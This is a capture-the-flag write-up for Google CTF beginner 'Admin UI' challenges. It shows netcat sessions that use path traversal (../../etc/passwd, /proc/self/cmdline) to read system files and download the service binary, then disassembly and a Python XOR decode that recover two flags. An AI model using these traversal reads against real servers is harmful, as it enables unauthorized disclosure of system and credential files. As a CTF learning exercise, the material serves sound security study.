### ADMIN UI 1,2,3
Challenge Link [1](https://capturetheflag.withgoogle.com/?#beginners/pwn-re-mngmnt-iface)
[2](https://capturetheflag.withgoogle.com/?#beginners/pwn-re-mngmnt-iface2)
[3](https://capturetheflag.withgoogle.com/?#beginners/pwn-re-mngmnt-iface3)

#### Dynamic Analysis
- Path Traversal Issue

		$ nc mngmnt-iface.ctfcompetition.com 1337
		=== Management Interface ===
		 1) Service access
		 2) Read EULA/patch notes
		 3) Quit
		2
		The following patchnotes were found:
		 - Version0.2
		 - Version0.3
		Which patchnotes should be shown?
		../../../../../../../etc/passwd
		root:x:0:0:root:/root:/bin/bash
		daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
		...
		user:x:1337:1337::/home/user:

- Let's get the executable file name of this process: `./main`

		$ printf "2\n../../../../../../../proc/self/cmdline\n3\n" | nc mngmnt-iface.ctfcompetition.com 1337
		...
		./main=== Management Interface ===
		...

- And download the file

		$ printf "2\n../../../../../../../home/user/main\n3\n" | nc mngmnt-iface.ctfcompetition.com 1337 > main

- Remove noises from main (Banners... Inputs.. I simply used vim)

		$ file main
		main: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=e78c178ffb1ddc700123dbda1a49a695fafd6c84, not stripped
		
		$ ./main
		=== Management Interface ===
		 1) Service access
		 2) Read EULA/patch notes
		 3) Quit
		2
		No patchnotes found!
		
		$ ./main
		=== Management Interface ===
		 1) Service access
		 2) Read EULA/patch notes
		 3) Quit
		1
		Please enter the backdoo^Wservice password:
		Login mechanism corrupted!

#### Static Analysis of main
- When I debugged `main` with the key-string `Please enter the backdoo^Wservice password:` and `Login mechanism corrupted!`
- I cound figure out it tries to read flag from the file `flag` in the same dir.


		_Z13primary_loginv:        // primary_login()
		push       rbp          ; End of unwind block (FDE at 0x41414e58), Begin of unwind block (FDE at 0x41414e78), CODE XREF=main+264
		mov        rbp, rsp
		sub        rsp, 0x110
		lea        rdi, qword [aPleaseEnterThe] ; argument "__s" for method j_puts, "Please enter the backdoo^Wservice password:"
		call       j_puts       ; puts
		mov        esi, 0x0     ; argument "__oflag" for method j_open
		lea        rdi, qword [_ZL9FLAG_FILE] ; argument "__file" for method j_open, _ZL9FLAG_FILE
		mov        eax, 0x0
		call       j_open       ; open
		mov        dword [rbp+var_4], eax
		lea        rdx, qword [rbp+var_90]
		mov        eax, 0x0
		mov        ecx, 0x10
		mov        rdi, rdx
		rep stosq  qword [rdi], rax
		cmp        dword [rbp+var_4], 0xffffffff
		jne        loc_414145ce

- `_ZL9FLAG_FILE`

		_ZL9FLAG_FILE:        // FLAG_FILE
		0000000041414a2c         db  0x66 ; 'f'             ; DATA XREF=_Z13primary_loginv+28
		0000000041414a2d         db  0x6c ; 'l'
		0000000041414a2e         db  0x61 ; 'a'
		0000000041414a2f         db  0x67 ; 'g'
		0000000041414a30         db  0x00 ; '.'
		0000000041414a31         db  0x00 ; '.'
		0000000041414a32         db  0x00 ; '.'
		...

#### Flag for Admin UI 1
- Got Flag

		$ printf "2\n../../../../../../../home/user/flag\n3\n" | nc mngmnt-iface.ctfcompetition.com 1337
		=== Management Interface ===
		 1) Service access
		 2) Read EULA/patch notes
		 3) Quit
		The following patchnotes were found:
		 - Version0.2
		 - Version0.3
		Which patchnotes should be shown?
		CTF{I_luv_buggy_sOFtware}=== Management Interface ===
		 1) Service access
		 2) Read EULA/patch notes
		 3) Quit

#### Flag for Admin UI 2
- Further Analysis of the `main`, I found there's another auth function called `secondary_login()`, which
- compares user input with below string

		_ZL4FLAG:        // FLAG
		0000000041414a40         dq         0x98a8b093bc819384             ; DATA XREF=_Z15secondary_loginv+151
		0000000041414a48         dq         0x83b5a8b094b4a697             ; DATA XREF=_Z15secondary_loginv+158
		0000000041414a50         dq         0xb5a2b3b3a28598bd             ; DATA XREF=_Z15secondary_loginv+179
		0000000041414a58         dq         0x98f698a9f3afb398             ; DATA XREF=_Z15secondary_loginv+186
		0000000041414a60         dw         0xf8ac                         ; DATA XREF=_Z15secondary_loginv+201
		0000000041414a62         db         0xba                           ; DATA XREF=_Z15secondary_loginv+212

- being xored with `xor        eax, 0xffffffc7`

- It's Little Endian and ASCII representaion of `FLAG` is

		>>> import codecs
		>>> l = ['98a8b093bc819384', '83b5a8b094b4a697', 'b5a2b3b3a28598bd', '98f698a9f3afb398', 'f8ac', 'ba']
		>>> for _ in l:
		...     h += codecs.encode(codecs.decode(_, 'hex')[::-1], 'hex')
		...
		>>> h
		'849381bc93b0a89897a6b494b0a8b583bd9885a2b3b3a2b598b3aff3a998f698acf8ba'
		>>> i = 'c7'*35
		>>> hex(int(h, 16)^int(i, 16))
		'0x4354467b54776f5f50617353776f72447a5f4265747465725f7468346e5f315f6b3f7dL'
		>>> codecs.decode('4354467b54776f5f50617353776f72447a5f4265747465725f7468346e5f315f6b3f7d', 'hex')
		'CTF{Two_PasSworDz_Better_th4n_1_k?}'